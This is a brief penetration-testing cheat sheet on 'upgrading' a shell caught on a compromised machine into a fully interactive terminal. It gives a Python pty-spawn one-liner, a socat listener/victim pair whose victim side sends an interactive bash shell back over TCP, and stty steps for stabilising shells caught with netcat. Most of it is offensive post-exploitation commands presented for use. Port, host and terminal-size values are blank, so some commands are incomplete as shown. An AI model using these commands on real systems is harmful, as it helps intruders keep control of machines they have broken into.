Shell Upgrades

Everyone hates having a non-interactive session. Here are some ways to get out of that. Each method requires that the requisite software is installed. If it isn't you're not going to get that upgrade. 

  
PYTHON:
python -c 'import pty; pty.spawn("/bin/bash")'

SOCAT (listener, victim):
socat file:`tty`,raw,echo=0 tcp-listen:
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp::

STTY Upgrades:
Run the Python upgrade and background (CTRL+Z) the session.
Show the stty options and foreground the session
$ stty raw -echo
$ fg
Reset the shell session and copy the stty options over.
The rows and columns numbers will be displayed at the top.
$ reset
$ export SHELL=bash
$ export TERM=xterm-256color
$ stty rows  cols

The Python method only gives a pseudo-terminal, but if you want to get a fully interactive session you can run the third method. This will allow you fully interactive sessions over netcat connections.
